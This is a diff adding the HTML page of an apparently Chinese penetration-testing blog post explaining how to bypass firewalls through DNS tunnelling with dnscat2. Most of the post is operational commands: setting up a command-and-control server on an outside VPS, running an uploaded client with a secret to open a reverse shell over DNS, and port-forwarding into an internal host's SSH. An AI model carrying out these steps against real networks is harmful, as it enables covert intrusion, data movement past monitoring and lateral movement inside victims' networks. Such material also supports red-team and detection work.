@@ -1,0 +1,207 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>通过DNS协议绕过防火墙</title>
+  <link rel="icon" href="/favicon.ico">
+  <link rel="apple-touch-icon" href="/public/img/head.png">
+  <link rel="stylesheet" href="/public/css/amazeui.min.css">
+  <link rel="stylesheet" href="/public/css/app.css">
+  <link rel="stylesheet" href="/public/css/highlight-js/github.css">
+</head>
+<body>
+
+<div class="am-container lp-container">
+  <header class="am-topbar lp-topbar">
+    <h1 class="am-topbar-brand">
+      <a href="/">Tomato's Blog</a>
+    </h1>
+    <button class="am-topbar-btn am-topbar-toggle am-btn am-btn-sm am-btn-danger am-show-sm-only" data-am-collapse="{target: '#lp-topbar-collapse'}"><span class="am-sr-only">导航切换</span> <span class="am-icon-bars"></span></button>
+    <div class="am-collapse am-topbar-collapse am-topbar-right" id="lp-topbar-collapse">
+      <ul class="am-nav am-nav-pills am-topbar-nav">
+        <li><a href="/">Archives</a></li>
+        <!-- <li><a href="#">Categories</a></li> -->
+        <li><a href="/friends.html">Friends</a></li>
+        <!-- <li><a href="#">About Me</a></li> -->
+        <li><a href="/feed.xml">Feed</a></li>
+      </ul>
+    </div>
+  </header>
+</div>
+
+
+<div class="am-container lp-container">
+  <div class="lp-post">
+    <div class="lp-post-header">
+      <h1 class="lp-post-title">通过DNS协议绕过防火墙</h1>
+      <div class="lp-post-meta">
+        <i class="am-icon-calculator"></i><span class="lp-post-date">2016-06-03</span>
+        <i class="am-icon-tags"></i><span class="lp-post-tags">penetration</span>
+      </div>
+    </div>
+    <div class="lp-post-content">
+    <p>工具</p>
+
+<p>[https://github.com/iagox86/dnscat2][1]</p>
+
+<p>测试环境</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>ubuntu 14.04 root用户
+windows7 x64 user用户
+</code></pre>
+</div>
+
+<p><strong>0x01环境准备</strong></p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>apt-get update
+apt-get -y install ruby-dev git make g++
+gem install bundler
+git clone https://github.com/iagox86/dnscat2.git
+cd dnscat2/server
+#修改Gemfile source 'https://ruby.taobao.org/'
+bundle install
+</code></pre>
+</div>
+
+<p>或者通过docker安装</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>apt-get install docker.io
+service docker status
+service docker start
+cd ~/dnscat2/server
+#修改Gemfile source 'https://ruby.taobao.org/'
+docker build .
+</code></pre>
+</div>
+
+<p>安装完成之后，可能在docker images 看到这个镜像没有名字，我们修改一下 docker tag IMAGEID  mpercival/dnscat2</p>
+
+<p><strong>0x02利用过程</strong></p>
+
+<p>server端</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>cd dnscat2/server
+ruby ./dnscat2.rb
+#docker用户  docker run -p 53:53/udp -it --rm mpercival/dnscat2 ruby ./dnscat2.rb
+</code></pre>
+</div>
+
+<p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2841831801.png" alt="2841831801" /></p>
+
+<p>可以通过两种方式设置C&amp;C地址，如果没有域名的话，直接在外网VPS运行ruby ./dnscat2.rb 有域名的童鞋，先设置好NS服务器将NS记录修改为当前的机器。然后通过ruby ./dnscat2.rb yourdomain 我这里使用的IP地址</p>
+
+<p>client端</p>
+
+<p>将dnscat2文件夹下面的client编译好成exe，然后上传到client端</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>dnscat2.exe --dns=server=server端ip --secret=c2c6d04cab68ee2947d80316858da0f8
+</code></pre>
+</div>
+
+<p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-04-17-3501735141.png" alt="3501735141" /></p>
+
+<p>由于在新版本的dnscat2是加密的所以我们在客户端执行的时候要加上秘钥，不然无法正确的建立连接
+<img src="http://ogmho3r7t.bkt.clouddn.com/2017-04-17-197873402.png" alt="197873402" /></p>
+
+<p>获取shell</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>session -i 1 #切换到session 1
+help #通过help可以看到支持的命令
+shell  #执行之后会新生成一个session  需要通过session -i 2 切过去
+</code></pre>
+</div>
+
+<p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-04-17-842306562.png" alt="842306562" /></p>
+
+<p>这样就成功获取了一个shell，我们可以通过数据包看一下</p>
+
+<p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-04-17-3078174618.png" alt="3078174618" /></p>
+
+<p>数据都是通过DNS发出去的，并且是加密过的，因为在最初的dnscat2的版本中，数据只是简单的hex编码。到最新版的默认就已经加密</p>
+
+<p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2981816537.png" alt="2981816537" /></p>
+
+<p>通过Salsa20加密算法进行了加密，如果不知道秘钥，就几乎不能解密数据包了。除了普通的反弹shell和上传下载文件功能，还有一个比较有用的功能
+可以通过dnscat2实现DNS隧道，然后进行内网渗透。在成功获取一个session之后执行</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>session -i id
+listen 4444 10.211.55.19:22 #将内网10.211.55.19的22端口转发到本地的4444
+</code></pre>
+</div>
+
+<p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2557060718.png" alt="2557060718" /></p>
+
+<p>然后直接ssh本地的ip的4444端口</p>
+
+<p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2093290607.png" alt="2093290607" /></p>
+
+<p>注意的是我用的docker环境，所以是直接ssh的docker的ip</p>
+
+<p><strong>0x03参考</strong>
+<a href="https://github.com/iagox86/dnscat2/">https://github.com/iagox86/dnscat2</a>
+<a href="https://zeltser.com/c2-dns-tunneling/">https://zeltser.com/c2-dns-tunneling/</a></p>
+
+
+    </div>
+    
+    <div id="disqus_thread"></div>
+<script type="text/javascript">
+var disqus_shortname = "tomatos-blog";
+
+/* * * DON'T EDIT BELOW THIS LINE * * */
+(function() {
+var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+  </div>
+</div>
+
+<div class="am-container lp-container">
+  <footer class="am-footer lp-footer">
+    <p>Copyright © 2014-2017 All Rights Reserved</p>
+    <p>Theme By <a href="https://github.com/RickGray/light-post">LightPost</a></p>
+  </afooter>
+</div>
+
+
+<div data-am-widget="gotop" class="am-gotop am-gotop-fixed">
+  <a href="#top" title="回到顶部">
+    <span class="am-gotop-title">GoTop</span>
+    <i class="am-gotop-icon am-icon-chevron-up"></i>
+  </a>
+</div>
+
+<script src="/public/js/jquery.min.js"></script>
+<script src="/public/js/amazeui.min.js"></script>
+<script>
+$(document).ready(function(){
+  $.AMUI.progress.start();
+});
+$(window).load(function(){
+  $.AMUI.progress.done();
+});
+</script>
+<script src="/public/js/highlight.pack.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+<!-- 网站统计代码 -->
+<div hidden>
+<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1256394309'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s95.cnzz.com/z_stat.php%3Fid%3D1256394309%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
+</div>
+<div hidden>
+<script>
+var _hmt = _hmt || [];
+(function() {
+var hm = document.createElement("script");
+hm.src = "//hm.baidu.com/hm.js?3601be0ac702a94d879f3f571cec1e53";
+var s = document.getElementsByTagName("script")[0];
+s.parentNode.insertBefore(hm, s);
+})();
+</script>
+</div>
+</body>
+</html>
